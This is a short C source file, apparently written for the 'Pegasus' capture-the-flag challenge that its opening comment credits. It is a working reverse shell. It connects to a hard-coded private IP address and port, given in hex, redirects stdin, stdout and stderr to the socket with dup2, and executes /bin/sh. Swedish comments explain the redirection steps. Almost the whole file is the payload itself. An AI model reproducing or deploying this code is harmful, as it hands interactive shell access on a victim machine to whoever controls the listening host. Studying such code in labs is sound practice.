



/* credits to http://blog.techorganic.com/2015/01/04/pegasus-hacking-challenge/ */
#include <stdio.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>

int main(int argc, char *argv[])
{
    struct sockaddr_in sa;
    int s;

    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = 0x6f4da8c0;  /* C0 A8 4D 6F;*/
    sa.sin_port = 0x0f27;/*270f;*/

    s = socket(AF_INET, SOCK_STREAM, 6);
    connect(s, (struct sockaddr *)&sa, sizeof(sa));
    /*här redirectar vi alltså vår ström, som vi skapade när vi satte upp vår socket - sen skickar vi strömmen vidare till stdin, stdout, stderr - */
    dup2(s, 0);
    dup2(s, 1);
    /*Om vi tar bort dup2(s,2) så kommer vi inte kunna se något från stderr */
    dup2(s, 2);

    execve("/bin/sh", 0, 0);
    return 0;
}
